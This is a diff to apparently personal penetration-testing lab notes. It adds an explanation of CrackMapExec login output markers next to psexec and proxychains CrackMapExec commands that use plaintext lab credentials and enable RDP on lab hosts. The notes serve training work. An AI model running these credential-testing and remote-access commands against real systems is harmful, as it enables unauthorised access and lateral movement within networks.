@@ -136,6 +136,10 @@ impacket-psexec offsec.local/allison@192.168.151.59
 ```
 ###### Crackmapexec
 ```
+Failed logins result in a [-]
+Successful logins result in a [+] Domain\Username:Password
+Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.
+
 rdp:
 proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
 proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE’
